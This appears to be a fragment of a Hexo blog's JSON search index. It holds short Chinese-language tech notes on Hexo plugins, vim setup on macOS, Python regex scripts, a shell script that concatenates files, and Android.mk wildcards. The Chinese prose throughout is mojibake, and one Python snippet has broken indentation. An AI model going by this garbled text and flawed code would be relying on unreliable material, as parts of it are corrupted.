\n\n# æ–‡å­—æ˜¾ç¤ºåŠ ç©ºæ ¼\ngit clone https://github.com/theme-next/theme-next-pangu.git source/lib/pangu\n\n# è¯»å–è¿›åº¦\ngit clone https://github.com/theme-next/theme-next-reading-progress source/lib/reading_progress \n\n\n### hexo-next æ’ä»¶\n\n1. npm install hexo-symbols-count-time --save   # ç»Ÿè®¡å­—æ•°\n\nsymbols_count_time:\n  symbols: true\n  time: true\n  total_symbols: true\n  total_time: true\n  separated_meta: true\n  item_text_post: true\n  item_text_total: false\n  awl: 4\n  wpm: 275\n\n\n2. npm install hexo-abbrlink --save # é“¾æ¥æŒä¹…\n\npermalink: post/:abbrlink.html\nabbrlink:\n  alg: crc16 #support crc16(default) and crc32\n  rep: hex    #support dec(default) and hex\n  \n  \n3. npm install hexo-auto-category --save #è‡ªåŠ¨åˆ†ç±»\n\nauto_category:\n enable: true\n depth:\n \n \n4. npm install hexo-generator-searchdb --save # æœ¬åœ°æœç´¢\n\nsearch:\n  path: search.json\n  field: post\n  format: html\n  limit: 10000\n  content: true\n  \n#ç„¶åæ‰“å¼€æœ¬åœ°local_search\nlocal_search:\n\tenable: true\n  \n```\n\n\n\n### 4.1 ç½®é¡¶\n\nhttps://github.com/netcan/hexo-generator-index-pin-top\n\n\n\n# 5. é—®é¢˜è§£å†³æ–¹æ¡ˆ\n\n### 5.1 ç”Ÿæˆç©ºç™½é¡µ\n\n+ ç”Ÿæˆé¡µé¢å¦‚æœç©ºç™½çš„è¯, æ¢ä¸ªä¸»é¢˜å†é‡æ–°ç”Ÿæˆä¸€æ¬¡\n+ æ›´æ–°ä¸‹ä¸»é¢˜ä»“åº“\n\n### 5.2  WARN No layout\n\nçœ‹çœ‹ä¸»é¢˜é‡Œé¢ç©¶ç«Ÿæœ‰æ²¡æœ‰ä¸œè¥¿,æ–‡ä»¶å¤¹åå­—å’Œä¸»é¢˜æ˜¯å¦å¯¹åº”\n\n### 5.3 ä½¿ç”¨é“¾æ¥æŒä¹…åå›¾ç‰‡æ— æ³•æ˜¾ç¤º\n\n+ https://github.com/rozbo/hexo-abbrlink/issues/19\n\n```javascript\n# vi node_modules/hexo-asset-image/index.js     #24è¡Œ\n\n// var endPos = link.length-1; // æ¢æˆä¸‹é¢çš„è¿™å¥è¯\nvar endPos = link.length-5; //å› ä¸ºæˆ‘çš„permalink: p/:abbrlink.html,  è¿™é‡Œè¦æ”¹æˆ-5\n```\n\n### 5.4 è¯ä¹¦æ›´æ–°\n\n1. coding\n\n+ æš‚åœdnsè§£ægithub \n+ codingç”³è¯·è¯ä¹¦\n+ å†æ‰“å¼€è§£ægithub\n\n2. github\n\n### 5.5 ä¸»é¢˜æ›´æ–°\n\n+ fork åˆ°è‡ªå·±github, ç”¨æ–°çš„åˆ†æ”¯, ä¿®æ”¹äº†ä¸€äº›language\n+ å®šæœŸåŒæ­¥æœ€æ–°çš„ä»“åº“ä¸»é¢˜\n\n### 5.6 å¤‡æ¡ˆ\n\n+ ICPå¤‡æ¡ˆ\n\n  äº‘æœåŠ¡å™¨è¿›è¡Œ ICP å¤‡æ¡ˆ\n\n+ å…¬å®‰å¤‡æ¡ˆ\n\n  http://www.beian.gov.cn/portal/index.do\n\n  \n\n# 6. å¸¸ç”¨å‘½ä»¤\n\n```html\nhexo clean --config source/_data/next.yml && hexo g -d --config source/_data/next.yml\n\n---\ntitle: \"\"\ndate: 2018-05-19 17:54:46\ntags:\n- golang\n- linux\n---\n\n<!-- more -->\n\n\n![1](Kademlia_DHT_KRPC_BitTorrentåè®®/1.png)\n```\n\n","tags":["hexo"]},{"title":"shellæ‰¹é‡æ–‡ä»¶å†…å®¹å¤åˆ¶åˆ°ä¸€ä¸ªæ–‡ä»¶å†…","url":"%2Fp%2F875a198.html","content":"\n> å…¬å¸éœ€è¦æŠŠæ‰€æœ‰ä»£ç æ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶å†…,åŠ ä¸Šç‰ˆæƒä¿¡æ¯. äºæ˜¯ç”¨shellç®€å•çš„å¤„ç†äº†ä¸‹\n\n```shell\n#!/bin/sh\n\nNAME=\"a.txt\"\nif [ -f $NAME ]; then\n\t`rm $NAME`\nfi\n\nDIR=\"\"\nFILE=\"\"\nfor file in `ls -R`\ndo\n\tif [ -f $file ]; then\n\t\tif [ $file = \"a.sh\" ];then\n\t\t\tcontinue\t\n\t\tfi\n#\t\techo \"===================== $file begin =====================\" >> $NAME\n#\t\t`cat $file >> $NAME`\n#\t\techo \"===================== $file end =====================\" >> $NAME\n\t\techo $file\t\t\n\telse \n\t\tif  [ ${file:0:1} = \".\" ];then\n\t\t\tDIR=${file/://}\n\t\telse  \n\t\t\tif [ \"$DIR\" != \"\" ] && [ ${DIR:0:6} = \"./base\" ];then\n\t\t\t\tcontinue #æ­¤å¤„å¯ä»¥è¿‡æ»¤ä¸æƒ³è¦çš„æ–‡ä»¶å¤¹\t\n\t\t\tfi\n\t\t\tFILE=$DIR$file\n\t\t\tif [ -f $FILE ]; then\n\t\t#\t\techo \"===================== $file begin =====================\" >> $NAME\n\t\t#\t\t`cat $FILE >> $NAME`\n\t\t#\t\techo \"===================== $file end =====================\" >> $NAME\n\t\t\t\techo $FILE\n\t\t\tfi\n\t\tfi\n\tfi\ndone\n```\n","tags":["shell"],"categories":["shell"]},{"title":"pythonä½¿ç”¨æ­£åˆ™åå‘å¼•ç”¨æ›¿æ¢å­—ç¬¦ä¸²","url":"%2Fp%2F136fd428.html","content":">å·¥ä½œéœ€è¦æŠŠ `Mud makes my mom mad.` è¿™å¥è¯å¸¦æœ‰mçš„åŠ ä¸Šé¢œè‰²,æˆ–è€…æŠŠæŸäº›å•è¯åŠ ä¸Šé¢œè‰²\n>ä¸´æ—¶å†™äº†ä¸ªè„šæœ¬å¤„ç†\n\n```python\nimport re\nimport sys\n\n\n# replace letter\n#find = \"m\"\n#str = \"Mud makes my mom mad.\"\n\n#replace key words\n#find = \"Mud|makes|mad\"\n#str  = \"Mud makes my mom mad.\"\n\n# how to use\n# python b.py \"m\"\t\"Mud makes my mom mad.\" \n# python b.py \"mud|mess|mop|make|the|help\"\t\"Mud makes my mom mad.\"\n\n\nfind  = sys.argv[1] \nstr   = sys.argv[2] \n\n\nresult = re.sub(r'('+find+')', r'<color:#ff0000>\\1</color>', str, 0, re.IGNORECASE)\nprint result\n\n```\n","tags":["python"],"categories":["python"]},{"title":"macç³»ç»Ÿvimå‡çº§æµç¨‹","url":"%2Fp%2F4ea69092.html","content":"\n#### æ‰§è¡Œå‘½ä»¤å®‰è£…vim æ³¨æ„è¦åŠ ä¸Š`--with-override-system-vi`\n```bash\nbrew install vim --with-override-system-vi\n```\n\n\n#### å®‰è£…è¿‡ç¨‹ä¸­å¦‚æœå‡ºç° ruby.hæ‰¾ä¸åˆ°\n\næ‰§è¡Œä¸‹é¢çš„å‘½ä»¤\n\n```bash\ncd /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.11.sdk/System/Library/Frameworks/Ruby.framework/Versions/2.0/usr/include/ruby-2.0.0/ruby\n```\n\n```bash\nsudo ln -s ../universal-darwin15/ruby/config.h ./config.h\n```\næ³¨æ„ä¸è¦å¤åˆ¶ä¸Šé¢çš„, å¯¹åº”è‡ªå·±çš„sdkç‰ˆæœ¬,rubyç‰ˆæœ¬,darwinç‰ˆæœ¬\n\n\n<!-- more -->\n#### ç»™è‡ªå·±çš„vimåšä¸ªåˆ«å, æ³¨æ„è‡ªå·±vimçš„ç‰ˆæœ¬è·¯å¾„\n\n```bash\nalias vim=\"/usr/local/Cellar/vim/7.4.2152/bin/vim\"\n```\n\n\n\n#### å‡çº§vimåå¦‚æœä¸»é¢˜ä¸æ˜¾ç¤º\næŠŠè‡ªå·±ä¸»é¢˜æ–‡ä»¶æ”¾åˆ°è¿™ä¸ª `/usr/local/Cellar/vim/7.4.2152/bin/vim`é‡Œ\n\n\n#### è®©gitä¹Ÿé€‚åº”æœ€æ–°çš„vim\n\n```bash\ngit config --global core.editor /usr/local/Cellar/vim/7.4.2152/bin/vim\n```\n\n\n--------\n\n## å¦å¤–ä¸€ç§æ–¹æ¡ˆ, å®‰è£…macvim\n\nInstall the latest version of MacVim. Yes, MacVim. And yes, the latest.\n\nIf you don't use the MacVim GUI, it is recommended to use the Vim binary that is inside the MacVim.app package (MacVim.app/Contents/MacOS/Vim). To ensure it works correctly copy the mvim script from the MacVim download to your local binary folder (for example /usr/local/bin/mvim) and then symlink it:\n\n\n\n```\nalias vim=\"/Applications/MacVim.app/Contents/MacOS/Vim\"\ngit config --global core.editor /Applications/MacVim.app/Contents/MacOS/Vim\n```\n\nIt requires Vim 7.3.885 or later with Lua support (\"+lua\").\n```\nbrew install macvim --with-lua\n```\n","tags":["vim"],"categories":["è½¯ä»¶"]},{"title":"golangé…ç½®vim","url":"%2Fp%2F3feff448.html","content":"### é…ç½®æ–‡ä»¶å’Œå¿«é€Ÿè®¾ç½®\n- [.vimrc][1]\n- [.zhsrc][2]\n[1]: https://github.com/unix2dos/go-tutorial/blob/master/.vimrc\n[2]: https://github.com/unix2dos/go-tutorial/blob/master/.zshrc\n\n1. PlugClean\n2. PlugInstall\n3. å»åˆ°YCMé‡Œæ‰§è¡Œ\n```\n./install.py --clang-completer --gocode-completer\n```\n\n\n### å®‰è£…æ’ä»¶ç®¡ç†å™¨\n```bash\ncurl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n```\n\n### å®‰è£…æ’ä»¶\n```bash\ncall plug#begin()\nPlug 'fatih/vim-go' \"go\nPlug 'tomasr/molokai' \"ä¸»é¢˜\nPlug 'SirVer/ultisnips' \"tabè¡¥å…¨\nPlug 'ctrlpvim/ctrlp.vim' \"å¿«é€ŸæŸ¥æ–‡ä»¶\nPlug 'Shougo/neocomplete.vim' \"å®æ—¶æç¤º\nPlug 'majutsushi/tagbar' \"tagbar\nPlug 'scrooloose/nerdtree' \"å¯¼èˆª\nPlug 'vim-airline/vim-airline' \"ä¸‹é¢\ncall plug#end()\n```\n<!-- more -->\n\n###  å®‰è£…go toolséœ€è¦çš„ä¸œè¥¿ï»¿\nç›´æ¥ä½¿ç”¨`:GoInstallBinaries`å®‰è£…\nå¦‚æœç½‘ç»œä¸è¡Œ(ä½ æ‡‚çš„), æŠŠä»£ç†æŠŠåŒ…éƒ½ä¸‹è½½ä¸‹æ¥\n\n```bash\ngit clone https://go.googlesource.com/tools  \n```\n\n\n### goTagséœ€è¦å®‰è£…ctags\n\n```bash\nbrew install ctags\n```\nï»¿\n\n### ä»£ç å®æ—¶æç¤ºneocomplete, éœ€è¦vimæ”¯æŒlua\n```bash\nbrew uninstall vim\nbrew install luajit\nbrew install vim --with-luajit\n```\n\n\n### Gocode autocomplete non imported packages\n```\ngocode set unimported-packages true\n```","tags":["vim"],"categories":["golang"]},{"title":"pythonè¯»å–æ–‡ä»¶å»é™¤html_xmlæ ‡ç­¾","url":"%2Fp%2Ff3ea3847.html","content":"\n> è‡ªå·±å†™çš„ä¸€ä¸ªç®€å•å»é™¤htmlæ ‡ç­¾(xml)çš„è„šæœ¬\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<text font=\"Palatino Linotype\">\n<p>\n<s end_audio=\"262\" start_audio=\"13\">\n<w end_audio=\"94\" id=\"0\" start_audio=\"13\" variants=\"mud\">Mud</w>\n<w end_audio=\"122\" id=\"1\" start_audio=\"95\">makes</w>\n<w end_audio=\"140\" id=\"2\" start_audio=\"123\">my</w>\n<w end_audio=\"215\" id=\"3\" start_audio=\"141\">mom</w>\n<w end_audio=\"262\" id=\"4\" start_audio=\"216\" variants=\"mad\">mad.</w>\n</s>\n</p>\n</text>\n```\n\n```python\nimport re\nimport sys\n\n# how to use\n# pythone a.py C6M01B1-001.xml\n\nfile = sys.argv[1]\nf = open(file, 'r')\n\nres = \"\"\nfor line in f.readlines():\n\t#str = re.sub(r'</?\\w+[^>]*>','',line)\n\tstr = re.sub(r'<(/|\\?)?\\w+[^>]*>','',line)\n\tif str != '\\r\\n':\n\tres = res + str\n\tres = re.sub('\\r\\n',' ',res)\n\tprint res\n#print \"len =\",len(res)\n```\n","tags":["python"],"categories":["python"]},{"title":"markdownè¯­æ³•é›†åˆ","url":"%2Fp%2F1ef7af3b.html","content":"\n\n> This is a blockquote.\n> \n> This is the second paragraph in the blockquote.\n>\n> ## This is an H2 in a blockquote\n\n\n\nSome of these words *are emphasized*.\n\nUse two asterisks for **strong emphasis**.\t\n\n<!-- more -->\n\t\t\n\t\t\t\t\t\n- Candy.\n- Gum.\n- Booze.\n\n\t\t\n1. Red\n2. Green\n3. Blue\n\n\nThis is an [example link](http://example.com/)\n\nI get 10 times more traffic from [Google][1] than from\n[Yahoo][2] or [MSN][a].\n\n[1]: http://google.com/ \"Google\"\n[2]: http://search.yahoo.com/ \"Yahoo Search\"\n[a]: http://search.msn.com/ \"MSN Search\"\n\n\n\n\n![alt text](/images/a.jpg \"Title\")\n\n![alt text][id]\n\n[id]: /images/a.jpg \"Title\"\n\n\nI strongly recommend against using any `<blink>` tags.\n\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86   \n    src=\"http://music.163.com/outchain/player?type=2&id=25706282&auto=0&height=66\">  \n</iframe> \n\n<iframe   \n    height=498 width=510   \n    src=\"http://www.iqiyi.com/v_19rr9nypk0.html\"\n    frameborder=0 allowfullscreen>  \n</iframe>  \n\n\n| Tables        | Are           | Cool  |\n| ------------- |:-------------:| -----:|\n| col 3 is      | right-aligned | $1600 |\n| col 2 is      | centered      |   $12 |\n| zebra stripes | are neat      |    $1 |\n\n","tags":["markdown"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"androidè‡ªåŠ¨æ·»åŠ æ–‡ä»¶åˆ°android-mk","url":"%2Fp%2F99b8fe68.html","content":"\nå°†\n```bash\nLOCAL_SRC_FILES := hellocpp/main.cpp \\  \n                   ../../Classes/AppDelegate.cpp \\  \n                   ../../Classes/HelloWorldScene.cpp \n```\næ¢æˆ\n\n```bash\nFILE_LIST := hellocpp/main.cpp    \nFILE_LIST += $(wildcard $(LOCAL_PATH)/../../Classes/*.cpp)    \nLOCAL_SRC_FILES := $(FILE_LIST:$(LOCAL_PATH)/%=%)   \n```\n\n----\n\n<!-- more -->\n**å¦å¤–ä¸€ç§æ–¹æ³•:**\n\n```bash\n#éå†ç›®å½•åŠå­ç›®å½•çš„å‡½æ•°  \ndefine walk  \n    $(wildcard $(1)) $(foreach e, $(wildcard $(1)/*), $(call walk, $(e)))  \nendef  \n  \n#éå†Classesç›®å½•  \nALLFILES = $(call walk, $(LOCAL_PATH)/../../Classes)  \nFILE_LIST := hellocpp/main.cpp  \n#ä»æ‰€æœ‰æ–‡ä»¶ä¸­æå–å‡ºæ‰€æœ‰.cppæ–‡ä»¶  \nFILE_LIST += $(filter %.cpp, $(ALLFILES))  \nLOCAL_SRC_FILES := $(FILE_LIST:$(LOCAL_PATH)/%=%)\n```\n","tags":["android"],"categories":["android"]},{"title":"gitbook--åˆ¶ä½œpdf","url":"%2Fp%2F1f9c8aa6.html","content":"\n## å‘½ä»¤è¡Œ:\ngitbook pdf Effective-Modern-Cpp-Zh  myname.pdf\n\n\n\n### å¦‚æœæ— æ³•ç”Ÿæˆ éœ€è¦å®‰è£… calibre  \n\nå®‰è£…åè¿˜è¦æ‰§è¡Œå‘½ä»¤\nln -s /Applications/calibre.app/Contents/MacOS/ebook-convert /usr/local/bin\n\n","tags":["others"],"categories":["git"]},{"title":"æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢","url":"%2Fp%2Fd95d7e09.html","content":"\næˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢,å†™ç‚¹ä»€ä¹ˆå¥½å‘¢? \nå¸Œæœ›ä»¥åèƒ½åšæŒå†™ä¸‹å»æŠŠ.\n","tags":["others"],"categories":["ä¸ªäººè®°å½•"]}]